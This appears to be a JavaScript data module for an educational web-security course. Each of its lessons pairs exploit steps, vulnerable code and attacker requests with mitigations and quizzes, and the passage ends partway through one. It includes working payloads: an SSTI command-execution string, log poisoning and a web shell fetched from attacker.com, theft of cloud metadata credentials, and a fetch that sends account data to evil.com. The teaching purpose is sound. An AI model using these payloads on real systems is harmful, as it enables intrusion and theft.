// Auto-generated field order: name, category, severity, definition, theory, cve, exploit, example, mitigation, quizzes.
// Categories follow OWASP-style groupings; severity is a qualitative CVSS-informed rating.
// `example` = { scenario: one-line real-world story, code: concrete vulnerable snippet / request-response }.
// `quizzes` = array of { question, options, answer } (3-4 per lesson, depth-dependent).
module.exports = [
  {
    "name": "Server-Side Request Forgery (SSRF)",
    "category": "Server-Side",
    "severity": "Critical",
    "definition": "SSRF allows an attacker to induce the server-side application to make HTTP requests to an arbitrary domain of the attacker's choosing.",
    "theory": "The server fetches a remote resource based on user-supplied input (a URL) without validating it. Attackers abuse this to reach internal services (169.254.169.254 cloud metadata, localhost admin panels, internal APIs) not exposed externally. Bypasses: decimal IP, IPv6, DNS rebinding, redirect chains.",
    "cve": "CVE-2021-26855 (Microsoft Exchange ProxyLogon)",
    "exploit": "1. Find a param that fetches a URL (?url=...).\n2. Replace with http://169.254.169.254/latest/meta-data/ (AWS).\n3. Enumerate IAM creds: /latest/meta-data/iam/security-credentials/.\n4. Use stolen keys against the cloud account.",
    "example": {
      "scenario": "An online invoice generator that 'fetches a logo from a URL' is used to pivot into the company's private AWS network and steal cloud credentials.",
      "code": "// Vulnerable endpoint\napp.get('/fetch-logo', async (req, res) => {\n  const resp = await axios.get(req.query.url); // no validation!\n  res.send(resp.data);\n});\n\n// Attacker request\nGET /fetch-logo?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role"
    },
    "mitigation": "Whitelist domains, block private IP ranges, disable unused URL schemes, enforce IMDSv2.",
    "quizzes": [
      {
        "question": "Which internal IP is most commonly targeted in AWS SSRF attacks?",
        "options": ["127.0.0.1", "169.254.169.254", "10.0.0.1", "192.168.1.1"],
        "answer": 1
      },
      {
        "question": "What is the root cause that makes SSRF possible?",
        "options": [
          "The server makes a request to a user-supplied URL without validating it",
          "The client browser caches images",
          "The database uses weak passwords",
          "TLS certificates are self-signed"
        ],
        "answer": 0
      },
      {
        "question": "Which technique can bypass a naive SSRF blocklist that only checks for 'localhost'?",
        "options": [
          "Using decimal/octal IP encoding or DNS rebinding",
          "Sending the request over UDP",
          "Using a longer password",
          "Encrypting the request body"
        ],
        "answer": 0
      },
      {
        "question": "What does enforcing IMDSv2 on AWS specifically defend against?",
        "options": [
          "SQL injection",
          "SSRF reaching the EC2 metadata endpoint without a session token",
          "Cross-site scripting",
          "Brute-force login attempts"
        ],
        "answer": 1
      }
    ]
  },
  {
    "name": "XML External Entity (XXE) Injection",
    "category": "Injection",
    "severity": "High",
    "definition": "XXE allows an attacker to interfere with an application's processing of XML data, often disclosing files or causing SSRF.",
    "theory": "XML parsers allowing DOCTYPE/external entities can be tricked into reading local files or making network requests. Caused by insecurely configured parsers (DTD enabled).",
    "cve": "CVE-2018-1000840",
    "exploit": "1. Submit XML with malicious DTD:\n<?xml version=\"1.0\"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n<root><data>&xxe;</data></root>\n2. Server reflects /etc/passwd.\n3. Use php://filter or OOB for blind XXE.",
    "example": {
      "scenario": "A resume-upload feature that parses an applicant's XML-based portfolio file is used to read the server's /etc/passwd and internal config files.",
      "code": "<!-- Malicious resume.xml uploaded by attacker -->\n<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<resume><name>&xxe;</name></resume>\n\n// Server response (reflected name field)\n{\"name\": \"root:x:0:0:root:/root:/bin/bash\\n...\"}"
    },
    "mitigation": "Disable DTDs and external entities; prefer JSON.",
    "quizzes": [
      {
        "question": "What must be enabled in an XML parser for XXE to work?",
        "options": ["JSON parsing", "DTD / external entity processing", "HTTPS", "Cookies"],
        "answer": 1
      },
      {
        "question": "Besides reading local files, what other major attack can XXE be used to launch?",
        "options": ["SSRF, via SYSTEM identifiers pointing to internal URLs", "SQL injection", "Buffer overflow", "Clickjacking"],
        "answer": 0
      },
      {
        "question": "What is the most effective fix for XXE?",
        "options": [
          "Encrypt the XML payload",
          "Disable DTDs / external entity resolution in the parser",
          "Add a CAPTCHA to the upload form",
          "Increase the upload file size limit"
        ],
        "answer": 1
      }
    ]
  },
  {
    "name": "Insecure Deserialization",
    "category": "Server-Side",
    "severity": "Critical",
    "definition": "Untrusted data is used to abuse app logic by deserializing malicious objects, often leading to RCE.",
    "theory": "Apps deserializing attacker-controlled objects (Java, PHP, Python pickle, .NET) can be forced to run gadget chains during reconstruction, causing RCE.",
    "cve": "CVE-2017-9805 (Apache Struts REST)",
    "exploit": "1. Identify serialized data (Java rO0AB..., PHP O:4:...).\n2. Use ysoserial to craft a gadget chain.\n3. Send payload; chain triggers command execution.",
    "example": {
      "scenario": "A Java web app stores user session state as a base64-serialized object in a cookie; an attacker swaps it for a ysoserial gadget chain and gets a reverse shell.",
      "code": "// Vulnerable cookie handling\nObject session = new ObjectInputStream(\n  new ByteArrayInputStream(Base64.decode(cookie))\n).readObject(); // deserializes attacker-controlled bytes directly\n\n// Attacker-crafted cookie (generated via ysoserial)\nCookie: session=rO0ABXNyAC5vcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMu...="
    },
    "mitigation": "Never deserialize untrusted data; HMAC integrity; allowlist classes.",
    "quizzes": [
      {
        "question": "Which tool generates Java deserialization gadget chains?",
        "options": ["sqlmap", "ysoserial", "Burp", "nmap"],
        "answer": 1
      },
      {
        "question": "Why is insecure deserialization so dangerous compared to typical input validation bugs?",
        "options": [
          "It only affects cookies",
          "Reconstructing the object can trigger code execution via gadget chains, not just bad data",
          "It always requires physical access",
          "It only works over HTTP, never HTTPS"
        ],
        "answer": 1
      },
      {
        "question": "What's a strong mitigation against deserialization attacks?",
        "options": [
          "Never deserialize untrusted input; use allowlists for permitted classes",
          "Increase session timeout",
          "Minify the JavaScript",
          "Use a CDN"
        ],
        "answer": 0
      }
    ]
  },
  {
    "name": "Server-Side Template Injection (SSTI)",
    "category": "Injection",
    "severity": "Critical",
    "definition": "User input embedded into a template engine unsafely, allowing template execution and often RCE.",
    "theory": "Template engines (Jinja2, Twig, Freemarker) evaluate expressions. If input reaches the template directly, attackers run server-side code.",
    "cve": "CVE-2019-8341 (Jinja2)",
    "exploit": "1. Inject {{7*7}} -> returns 49 confirms SSTI.\n2. Jinja2: {{ ''.__class__.__mro__[1].__subclasses__() }}.\n3. Find os/subprocess gadget to run commands.",
    "example": {
      "scenario": "A 'Contact Us' page that renders the user's name back in a confirmation message ('Hi {{name}}') using Jinja2 lets an attacker run shell commands on the server.",
      "code": "# Vulnerable Flask code\n@app.route('/greet')\ndef greet():\n    name = request.args.get('name')\n    return render_template_string(f'Hi {name}!')  # user input goes straight into the template\n\n# Attacker request\nGET /greet?name={{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}"
    },
    "mitigation": "Never concatenate input into templates; sandbox; logic-less templates.",
    "quizzes": [
      {
        "question": "Which payload is a classic SSTI detection probe?",
        "options": ["{{7*7}}", "' OR 1=1--", "<script>alert(1)</script>", "../../etc/passwd"],
        "answer": 0
      },
      {
        "question": "Why does SSTI often lead to full remote code execution, unlike simple template bugs?",
        "options": [
          "Template engines like Jinja2 expose Python object internals reachable from rendered expressions",
          "Templates always run as root",
          "Browsers execute templates client-side",
          "SSTI only affects CSS"
        ],
        "answer": 0
      },
      {
        "question": "What is the safest fix for SSTI?",
        "options": [
          "Never pass user input directly into the template string itself; pass it only as template variables/context",
          "Switch to a faster template engine",
          "Cache rendered templates",
          "Use a longer session token"
        ],
        "answer": 0
      }
    ]
  },
  {
    "name": "Cross-Site Request Forgery (CSRF)",
    "category": "Auth & Session",
    "severity": "Medium",
    "definition": "Tricks an authenticated user's browser into submitting a malicious request to a site where they're logged in.",
    "theory": "Browsers auto-send cookies, so a malicious page can forge state-changing requests if no anti-CSRF token is required.",
    "cve": "CVE-2018-9942",
    "exploit": "1. Craft auto-submitting HTML form to victim endpoint.\n2. Lure victim while logged in.\n3. Browser sends authenticated request -> action executes.",
    "example": {
      "scenario": "A logged-in bank customer visits an unrelated forum; a hidden auto-submitting form on that page silently transfers money out of their account using their existing session cookie.",
      "code": "<!-- Malicious page hosted on attacker.com -->\n<form action=\"https://bank.com/transfer\" method=\"POST\" id=\"f\">\n  <input type=\"hidden\" name=\"to\" value=\"attacker-account\">\n  <input type=\"hidden\" name=\"amount\" value=\"5000\">\n</form>\n<script>document.getElementById('f').submit();</script>"
    },
    "mitigation": "Anti-CSRF tokens, SameSite=Strict cookies, verify Origin/Referer.",
    "quizzes": [
      {
        "question": "Which cookie attribute best mitigates CSRF?",
        "options": ["HttpOnly", "Secure", "SameSite=Strict", "Domain"],
        "answer": 2
      },
      {
        "question": "Why does CSRF work even though the attacker never sees the victim's cookies?",
        "options": [
          "Browsers automatically attach cookies to requests to the cookie's origin, regardless of which page triggered the request",
          "The attacker steals the cookie via JavaScript",
          "CSRF requires the victim to type their password on the malicious page",
          "Cookies are sent in the URL"
        ],
        "answer": 0
      },
      {
        "question": "What does a properly implemented anti-CSRF token prevent?",
        "options": [
          "An attacker site from forging a valid request, since it cannot read or guess the token",
          "SQL injection",
          "Brute force login",
          "DNS spoofing"
        ],
        "answer": 0
      }
    ]
  },
  {
    "name": "Path / Directory Traversal",
    "category": "Access Control",
    "severity": "High",
    "definition": "Read arbitrary files outside the intended directory using ../ sequences.",
    "theory": "Apps building file paths from input without sanitization let attackers escape the web root to sensitive files.",
    "cve": "CVE-2021-41773 (Apache HTTP Server)",
    "exploit": "1. Find ?file=report.pdf.\n2. Try ?file=../../../../etc/passwd.\n3. Encoding bypass: %2e%2e%2f or ....//",
    "example": {
      "scenario": "A document portal that lets users download reports via a filename parameter is used to walk out of the reports folder and read the server's password file.",
      "code": "// Vulnerable Express route\napp.get('/download', (req, res) => {\n  res.sendFile(`/var/www/reports/${req.query.file}`); // no sanitization\n});\n\n// Attacker request\nGET /download?file=../../../../etc/passwd"
    },
    "mitigation": "Canonicalize paths, allowlists, avoid passing input to FS APIs.",
    "quizzes": [
      {
        "question": "What sequence is the hallmark of path traversal?",
        "options": ["&&", "../", "<>", "%00 only"],
        "answer": 1
      },
      {
        "question": "Which technique can bypass a filter that simply strips the literal string '../'?",
        "options": [
          "URL-encoding the sequence (%2e%2e%2f) or using nested traversal like '....//'",
          "Sending the request twice",
          "Using uppercase letters in the filename",
          "Adding extra spaces"
        ],
        "answer": 0
      },
      {
        "question": "What is the most robust defense against path traversal?",
        "options": [
          "Canonicalize the resolved path and verify it's still inside the allowed base directory, plus use an allowlist of filenames",
          "Block requests containing the word 'etc'",
          "Rate-limit the endpoint",
          "Use HTTPS only"
        ],
        "answer": 0
      }
    ]
  },
  {
    "name": "Local File Inclusion (LFI)",
    "category": "Access Control",
    "severity": "High",
    "definition": "Include local files on the server through dynamic inclusion mechanisms.",
    "theory": "Scripts that include files based on input (PHP include) can read logs/configs or escalate to RCE via log poisoning / PHP wrappers.",
    "cve": "CVE-2018-16763 (FUEL CMS)",
    "exploit": "1. ?page=about -> ?page=../../../../etc/passwd.\n2. php://filter/convert.base64-encode/resource=index.php.\n3. Log poisoning + LFI -> RCE.",
    "example": {
      "scenario": "A PHP site that loads page content via a 'page' query parameter is abused to include the Apache access log after an attacker poisons it with PHP code in their User-Agent header, achieving remote code execution.",
      "code": "// Vulnerable PHP\n<?php include($_GET['page'] . '.php'); ?>\n\n// Step 1: poison access log via User-Agent header\nUser-Agent: <?php system($_GET['cmd']); ?>\n\n// Step 2: include the log file to execute the injected PHP\nGET /index.php?page=../../../../var/log/apache2/access&cmd=id"
    },
    "mitigation": "Allowlist includable files; disable allow_url_include.",
    "quizzes": [
      {
        "question": "LFI can escalate to RCE through which technique?",
        "options": ["Log poisoning", "DNS spoofing", "ARP poisoning", "Phishing"],
        "answer": 0
      },
      {
        "question": "What PHP wrapper is commonly used in LFI to read source code as base64 instead of executing it?",
        "options": ["php://filter/convert.base64-encode/resource=", "http://", "ftp://", "data://text/plain"],
        "answer": 0
      },
      {
        "question": "Which configuration setting, if disabled, helps prevent LFI from escalating via remote wrappers?",
        "options": ["allow_url_include", "display_errors", "memory_limit", "max_execution_time"],
        "answer": 0
      }
    ]
  },
  {
    "name": "Remote File Inclusion (RFI)",
    "category": "Access Control",
    "severity": "Critical",
    "definition": "Include a remote attacker-hosted file into execution, often leading to RCE.",
    "theory": "With allow_url_include enabled and unsanitized input, the server fetches and executes a remote malicious script.",
    "cve": "CVE-2017-9841 (PHPUnit eval-stdin)",
    "exploit": "1. ?page=http://attacker.com/shell.txt.\n2. Server fetches & executes remote PHP shell.\n3. Gain command execution.",
    "example": {
      "scenario": "A legacy PHP CMS that includes a 'page' module by name is tricked into fetching and executing a PHP web shell hosted on an attacker's own server.",
      "code": "// Vulnerable PHP with allow_url_include=On\n<?php include($_GET['page']); ?>\n\n// Attacker-hosted shell.txt\n<?php system($_GET['cmd']); ?>\n\n// Attacker request\nGET /index.php?page=http://attacker.com/shell.txt&cmd=whoami"
    },
    "mitigation": "Disable allow_url_include and allow_url_fopen.",
    "quizzes": [
      {
        "question": "RFI includes files from where (vs LFI)?",
        "options": ["The local disk", "A remote attacker-controlled server", "The database", "Memory"],
        "answer": 1
      },
      {
        "question": "Which PHP setting must typically be enabled for classic RFI to work?",
        "options": ["allow_url_include", "short_open_tag", "error_reporting", "session.gc_maxlifetime"],
        "answer": 0
      },
      {
        "question": "Why is RFI generally considered more severe than LFI?",
        "options": [
          "The attacker fully controls the included code's content, not just which local file is read",
          "RFI never gets logged",
          "RFI requires no network access",
          "RFI only affects static files"
        ],
        "answer": 0
      }
    ]
  },
  {
    "name": "Open Redirect",
    "category": "Auth & Session",
    "severity": "Medium",
    "definition": "Craft a link that redirects victims to a malicious site via a trusted domain.",
    "theory": "Unvalidated redirect params enable phishing, OAuth token theft, SSRF chaining. The trusted domain builds victim confidence.",
    "cve": "CVE-2019-11510 context",
    "exploit": "1. Find ?redirect=/dashboard.\n2. Change to ?redirect=https://evil.com.\n3. Use in phishing to steal creds/OAuth codes.",
    "example": {
      "scenario": "A phishing email links to the real bank's login page with a redirect parameter pointing to a lookalike fake login page, so the link looks completely trustworthy at a glance.",
      "code": "// Vulnerable redirect handler\napp.get('/login', (req, res) => {\n  // ...after successful login...\n  res.redirect(req.query.redirect); // unvalidated\n});\n\n// Phishing link sent to victim (looks like the real bank domain)\nhttps://realbank.com/login?redirect=https://evil-realbank-lookalike.com"
    },
    "mitigation": "Relative paths only, allowlist targets, interstitial warnings.",
    "quizzes": [
      {
        "question": "Open redirects are most commonly abused for?",
        "options": ["Phishing / token theft", "Buffer overflow", "Race condition", "DoS"],
        "answer": 0
      },
      {
        "question": "Why are open redirects considered more dangerous in OAuth flows specifically?",
        "options": [
          "They can be chained to leak authorization codes/tokens to an attacker-controlled redirect_uri",
          "They slow down page load",
          "They bypass TLS entirely",
          "They corrupt the database"
        ],
        "answer": 0
      },
      {
        "question": "What's the safest fix for open redirects?",
        "options": [
          "Only allow relative paths or validate the target against an explicit allowlist of domains",
          "Add a CAPTCHA before redirecting",
          "Use a longer URL",
          "Log the redirect destination"
        ],
        "answer": 0
      }
    ]
  },
  {
    "name": "Race Condition (TOCTOU)",
    "category": "Business Logic",
    "severity": "High",
    "definition": "Timing of operations is manipulated to cause unintended behavior, e.g. double-spending.",
    "theory": "Time-of-check to time-of-use gaps let concurrent requests bypass limits (redeem coupon twice, withdraw twice).",
    "cve": "CVE-2016-5195 (Dirty COW)",
    "exploit": "1. Identify a limited action.\n2. Send many simultaneous requests (Turbo Intruder / single-packet).\n3. Multiple succeed before the check updates.",
    "example": {
      "scenario": "A gift-card redemption endpoint checks the card's balance and then deducts it in two separate steps; firing 20 redemption requests at the exact same instant drains far more value than the card actually had.",
      "code": "// Vulnerable logic (check-then-use, not atomic)\nconst card = await db.query('SELECT balance FROM cards WHERE id=$1', [id]);\nif (card.balance >= amount) {\n  await db.query('UPDATE cards SET balance = balance - $1 WHERE id=$2', [amount, id]);\n  // 20 parallel requests can all pass the check before any UPDATE commits\n}"
    },
    "mitigation": "Atomic operations, DB locks, idempotency keys, transactions.",
    "quizzes": [
      {
        "question": "Race conditions exploit the gap between which two events?",
        "options": ["Login and logout", "Check and use (TOCTOU)", "Request and response", "DNS and TCP"],
        "answer": 1
      },
      {
        "question": "What tool/technique is commonly used to fire many requests at nearly the same instant to exploit a race condition?",
        "options": ["Turbo Intruder / single-packet attack", "sqlmap", "nikto", "John the Ripper"],
        "answer": 0
      },
      {
        "question": "What's the most reliable fix for TOCTOU race conditions in a database-backed action?",
        "options": [
          "Perform the check-and-update as a single atomic database operation/transaction with proper locking",
          "Add a CAPTCHA",
          "Increase the session timeout",
          "Use HTTPS"
        ],
        "answer": 0
      }
    ]
  },
  {
    "name": "Business Logic Vulnerability",
    "category": "Business Logic",
    "severity": "Medium",
    "definition": "Flaws in business rule design/implementation allowing unintended behavior.",
    "theory": "Logic flaws: negative quantities, price manipulation, skipping payment, abusing workflows. Scanners can't find them.",
    "cve": "CVE-2020-11651 context",
    "exploit": "1. Add item, intercept, set quantity=-1.\n2. Total becomes negative -> account credited.\n3. Or skip payment and jump to 'order confirmed'.",
    "example": {
      "scenario": "An e-commerce checkout lets a shopper set a cart item's quantity to -1 in the intercepted request, flipping the total negative and crediting money back to their own account instead of charging them.",
      "code": "// Vulnerable cart logic — no validation on quantity sign\ncart.total = items.reduce((sum, i) => sum + i.price * i.quantity, 0);\n// attacker-modified request body\n{ \"items\": [ { \"sku\": \"LAPTOP-1\", \"price\": 999, \"quantity\": -1 } ] }\n// total becomes -999 -> applied as a credit to the account"
    },
    "mitigation": "Validate business rules server-side; enforce state machines.",
    "quizzes": [
      {
        "question": "Why are business logic flaws hard for scanners?",
        "options": ["They require understanding intended behavior", "They use encryption", "They are network-only", "They need root"],
        "answer": 0
      },
      {
        "question": "Which of these is a classic business logic flaw?",
        "options": [
          "Setting a cart quantity to a negative number to flip the total into a credit",
          "SQL injection in a login form",
          "An expired TLS certificate",
          "A missing security header"
        ],
        "answer": 0
      },
      {
        "question": "What is the core defense against business logic vulnerabilities?",
        "options": [
          "Enforce all business rules and valid state transitions server-side, never trust client-supplied values like price or quantity",
          "Use a faster framework",
          "Add more unit tests for UI rendering",
          "Minify JavaScript"
        ],
        "answer": 0
      }
    ]
  },
  {
    "name": "Subdomain Takeover",
    "category": "Infrastructure",
    "severity": "High",
    "definition": "A subdomain points to a deprovisioned external service an attacker can re-register.",
    "theory": "A dangling DNS CNAME points to an unclaimed service (S3, GitHub Pages, Heroku). Attacker claims it and serves content on the victim's subdomain.",
    "cve": "Multiple disclosed (HackerOne)",
    "exploit": "1. Enumerate subdomains (subfinder, amass).\n2. Find CNAMEs to unclaimed services (404 fingerprint).\n3. Register that service and host content.",
    "example": {
      "scenario": "A company decommissions a marketing campaign hosted on GitHub Pages but forgets to remove the DNS CNAME; an attacker registers the same GitHub Pages project name and now fully controls content served from promo.company.com.",
      "code": "// Dangling DNS record\npromo.company.com.  CNAME  old-campaign.github.io.\n\n// Attacker steps\n$ dig promo.company.com CNAME\n; old-campaign.github.io (returns 404 'There isn't a GitHub Pages site here')\n# Attacker creates a GitHub repo/Pages site named 'old-campaign' -> now serves their content on promo.company.com"
    },
    "mitigation": "Remove dangling DNS records; audit DNS regularly.",
    "quizzes": [
      {
        "question": "Subdomain takeover exploits a dangling what?",
        "options": ["TCP port", "DNS CNAME record", "Cookie", "JWT"],
        "answer": 1
      },
      {
        "question": "What's a common fingerprint that signals a subdomain is vulnerable to takeover?",
        "options": [
          "A distinctive 'not found' / unclaimed page returned by the third-party service (e.g. GitHub Pages 404)",
          "A 200 OK with valid content",
          "A redirect to the company homepage",
          "A 500 server error"
        ],
        "answer": 0
      },
      {
        "question": "What is the best practice to prevent subdomain takeover?",
        "options": [
          "Remove the DNS record immediately when decommissioning a third-party-hosted service",
          "Add a robots.txt file",
          "Lower the DNS TTL",
          "Use HTTPS only"
        ],
        "answer": 0
      }
    ]
  },
  {
    "name": "JWT Vulnerabilities",
    "category": "Auth & Session",
    "severity": "Critical",
    "definition": "Flaws in JWT implementation: 'none' algorithm, weak secrets, key confusion.",
    "theory": "JWTs are signed tokens. Misconfigs: accepting alg:none, brute-forcing HS256 secrets, RS256->HS256 key confusion.",
    "cve": "CVE-2015-9235 (jsonwebtoken)",
    "exploit": "1. Decode the JWT (base64).\n2. Set alg to 'none' and strip signature.\n3. Or crack HS256 secret with hashcat and re-sign as admin.",
    "example": {
      "scenario": "An API that accepts the JWT 'alg' header at face value lets an attacker simply change it to 'none', strip the signature, and forge a token claiming to be an admin user.",
      "code": "// Original token payload (decoded)\n{\"alg\":\"HS256\",\"typ\":\"JWT\"}.{\"sub\":\"user123\",\"role\":\"user\"}.SIGNATURE\n\n// Attacker-forged token\n{\"alg\":\"none\",\"typ\":\"JWT\"}.{\"sub\":\"user123\",\"role\":\"admin\"}.\n// Vulnerable server code\nconst decoded = jwt.verify(token, secret, { algorithms: ['HS256','none'] }); // accepting 'none' is the bug"
    },
    "mitigation": "Pin the algorithm, strong secrets/keys, strict validation.",
    "quizzes": [
      {
        "question": "Which JWT algorithm setting is dangerous if accepted?",
        "options": ["RS256", "none", "ES256", "HS512"],
        "answer": 1
      },
      {
        "question": "What is 'key confusion' in the context of JWT attacks?",
        "options": [
          "Tricking a server expecting RS256 (public/private key) into verifying a token with HS256 using the public key as the HMAC secret",
          "Forgetting your password",
          "Using two different cookies",
          "Mixing up session IDs between users"
        ],
        "answer": 0
      },
      {
        "question": "What's the strongest defense against JWT algorithm-confusion attacks?",
        "options": [
          "Explicitly pin/whitelist the expected algorithm on the server and never trust the alg header from the token itself",
          "Make the JWT longer",
          "Store JWTs in localStorage",
          "Use a shorter expiry only"
        ],
        "answer": 0
      }
    ]
  },
  {
    "name": "Clickjacking (UI Redressing)",
    "category": "Client-Side",
    "severity": "Medium",
    "definition": "Trick a user into clicking something different from what they perceive via invisible iframes.",
    "theory": "Attacker overlays a transparent iframe of a target over decoy content, so victim clicks trigger framed-site actions.",
    "cve": "Various framing issues",
    "exploit": "1. Iframe the target with opacity:0 over a fake button.\n2. Position the real button under the cursor.\n3. Victim clicks -> hidden action executes.",
    "example": {
      "scenario": "A 'Claim your free prize!' page secretly overlays a transparent iframe of a social media site's 'Follow' button exactly under the visible 'Claim' button, so clicking it actually follows an attacker-controlled account.",
      "code": "<!-- Attacker page -->\n<style>\n  iframe { position:absolute; top:0; left:0; opacity:0.0; width:300px; height:50px; }\n  .decoy-button { position:absolute; top:0; left:0; }\n</style>\n<iframe src=\"https://social.example/follow?user=attacker\"></iframe>\n<button class=\"decoy-button\">Claim your free prize!</button>"
    },
    "mitigation": "X-Frame-Options: DENY and CSP frame-ancestors 'none'.",
    "quizzes": [
      {
        "question": "Which header prevents clickjacking?",
        "options": ["X-Frame-Options", "Content-Type", "Cache-Control", "ETag"],
        "answer": 0
      },
      {
        "question": "What makes clickjacking deceptive to the victim?",
        "options": [
          "A transparent/invisible iframe of the real target site is positioned exactly under visible decoy content",
          "The attacker steals the victim's password",
          "The victim's browser is out of date",
          "The page uses an expired certificate"
        ],
        "answer": 0
      },
      {
        "question": "Besides X-Frame-Options, which modern CSP directive also defends against clickjacking?",
        "options": ["frame-ancestors", "script-src", "default-src", "img-src"],
        "answer": 0
      }
    ]
  },
  {
    "name": "CORS Misconfiguration",
    "category": "Auth & Session",
    "severity": "High",
    "definition": "Improper CORS config lets malicious sites read sensitive responses.",
    "theory": "Reflecting Origin into Access-Control-Allow-Origin with credentials lets any attacker site read authenticated responses.",
    "cve": "Many web app cases",
    "exploit": "1. Send request with Origin: https://evil.com.\n2. If reflected + Allow-Credentials:true, read victim data via JS.\n3. Exfiltrate to attacker server.",
    "example": {
      "scenario": "A dashboard API reflects whatever Origin header it receives back into Access-Control-Allow-Origin and also sets Allow-Credentials: true, letting an attacker's website read a logged-in victim's private account data via a background JS fetch.",
      "code": "// Vulnerable server response headers\nAccess-Control-Allow-Origin: https://evil.com   // reflected attacker origin\nAccess-Control-Allow-Credentials: true\n\n// Attacker page JS\nfetch('https://victim-app.com/api/account', { credentials: 'include' })\n  .then(r => r.json())\n  .then(data => fetch('https://evil.com/steal', { method:'POST', body: JSON.stringify(data) }));"
    },
    "mitigation": "Strict origin allowlist; never reflect arbitrary origins with creds.",
    "quizzes": [
      {
        "question": "Dangerous CORS combo reflects Origin together with what?",
        "options": ["Allow-Credentials: true", "HttpOnly", "Cache-Control", "Gzip"],
        "answer": 0
      },
      {
        "question": "What does a misconfigured CORS policy actually allow an attacker's JavaScript to do?",
        "options": [
          "Read the victim's authenticated response data cross-origin via the browser",
          "Modify the victim's DNS settings",
          "Install malware on the victim's machine",
          "Bypass TLS certificate validation"
        ],
        "answer": 0
      },
      {
        "question": "What is the correct fix for CORS misconfiguration?",
        "options": [
          "Maintain a strict, explicit allowlist of trusted origins instead of reflecting any Origin header",
          "Disable CORS entirely on all endpoints",
          "Always set Allow-Origin: *",
          "Add a CAPTCHA"
        ],
        "answer": 0
      }
    ]
  },
  {
    "name": "HTTP Request Smuggling",
    "category": "Infrastructure",
    "severity": "Critical",
    "definition": "Exploits front-end/back-end disagreement in parsing request boundaries.",
    "theory": "When proxy and back-end disagree on Content-Length vs Transfer-Encoding, attacker smuggles a hidden request, poisoning others' responses.",
    "cve": "CVE-2019-18277 (HAProxy)",
    "exploit": "1. Send crafted request with both CL and TE (CL.TE / TE.CL).\n2. Back-end mis-parses, leaving a prefix.\n3. Next user's request gets prepended -> hijack.",
    "example": {
      "scenario": "A front-end proxy and back-end server disagree on where one request ends, letting an attacker smuggle a hidden second request that gets prepended to the next legitimate visitor's request, hijacking their session.",
      "code": "POST /checkout HTTP/1.1\nHost: victim.com\nContent-Length: 13\nTransfer-Encoding: chunked\n\n0\n\nGET /admin HTTP/1.1\nX-Ignore: x\n\n// Front-end trusts Content-Length (sees a short, complete request)\n// Back-end trusts Transfer-Encoding (sees the chunked body end early at '0')\n// -> the smuggled 'GET /admin' line gets queued and prepended to the next user's request"
    },
    "mitigation": "Normalize requests, reject ambiguous CL/TE, HTTP/2 end-to-end.",
    "quizzes": [
      {
        "question": "Request smuggling abuses disagreement between which headers?",
        "options": ["Host & Referer", "Content-Length & Transfer-Encoding", "Cookie & Origin", "Accept & ETag"],
        "answer": 1
      },
      {
        "question": "In a 'CL.TE' smuggling attack, which component trusts the Content-Length header?",
        "options": ["The front-end proxy", "The back-end server", "Both equally", "Neither"],
        "answer": 0
      },
      {
        "question": "What is an effective infrastructure-level fix for HTTP request smuggling?",
        "options": [
          "Reject requests with ambiguous/conflicting Content-Length and Transfer-Encoding headers, or use HTTP/2 end-to-end",
          "Increase the Content-Length limit",
          "Disable chunked encoding only on the client",
          "Add more front-end servers"
        ],
        "answer": 0
      }
    ]
  },
  {
    "name": "Mass Assignment",
    "category": "Access Control",
    "severity": "High",
    "definition": "Framework auto-binds request params to object fields, setting unintended fields.",
    "theory": "ORMs auto-mapping JSON to model attributes let attackers add isAdmin:true or balance:9999 to requests.",
    "cve": "CVE-2012-2660 (Ruby on Rails)",
    "exploit": "1. Register/update with extra JSON: {\"username\":\"x\",\"role\":\"admin\"}.\n2. Framework binds role -> privilege escalation.",
    "example": {
      "scenario": "A user-profile update endpoint binds the entire JSON body directly onto the User model, so adding an extra 'role' field to the request silently promotes the attacker's own account to admin.",
      "code": "// Vulnerable controller (auto-binds all fields)\napp.put('/profile', (req, res) => {\n  Object.assign(currentUser, req.body); // no field allowlist\n  currentUser.save();\n});\n\n// Attacker request body\n{ \"displayName\": \"Het\", \"role\": \"admin\", \"isVerified\": true }"
    },
    "mitigation": "Allowlists (strong params), DTOs, explicit binding.",
    "quizzes": [
      {
        "question": "Mass assignment lets attackers set which fields?",
        "options": ["Only public fields", "Unintended sensitive fields like isAdmin", "CSS styles", "DNS records"],
        "answer": 1
      },
      {
        "question": "What underlying framework behavior causes mass assignment vulnerabilities?",
        "options": [
          "Automatically binding all incoming JSON/form fields onto a model object without restriction",
          "Weak password hashing",
          "Missing HTTPS",
          "Slow database queries"
        ],
        "answer": 0
      },
      {
        "question": "What's the standard fix for mass assignment?",
        "options": [
          "Use explicit allowlists / DTOs that only bind expected, safe fields",
          "Block all PUT requests",
          "Encrypt the request body",
          "Add rate limiting"
        ],
        "answer": 0
      }
    ]
  },
  {
    "name": "Prototype Pollution (JavaScript)",
    "category": "Client-Side",
    "severity": "High",
    "definition": "Attacker modifies Object.prototype, affecting all objects; can lead to RCE/DoS.",
    "theory": "Insecure recursive merge/clone lets keys like __proto__ inject properties into the base prototype, polluting every object.",
    "cve": "CVE-2019-10744 (lodash)",
    "exploit": "1. Send JSON: {\"__proto__\":{\"isAdmin\":true}}.\n2. Vulnerable merge pollutes Object.prototype.\n3. App treats all users as admin or crashes.",
    "example": {
      "scenario": "A settings-merge endpoint that recursively merges user-supplied JSON into a config object is tricked into injecting an 'isAdmin' property onto the global Object.prototype, making every object in the app — including other users' sessions — appear to be an admin.",
      "code": "// Vulnerable recursive merge (simplified, lodash.merge-style)\nfunction merge(target, src) {\n  for (let key in src) {\n    if (typeof src[key] === 'object') merge(target[key] ??= {}, src[key]);\n    else target[key] = src[key];\n  }\n}\nmerge(config, JSON.parse(req.body)); // no key filtering\n\n// Attacker payload\n{ \"__proto__\": { \"isAdmin\": true } }"
    },
    "mitigation": "Freeze prototypes, use Map, sanitize __proto__/constructor.",
    "quizzes": [
      {
        "question": "Which key is central to prototype pollution?",
        "options": ["__proto__", "self", "this", "window"],
        "answer": 0
      },
      {
        "question": "Why is prototype pollution especially dangerous in JavaScript apps?",
        "options": [
          "It can affect every object in the application that shares the polluted prototype, not just one record",
          "It only affects the database",
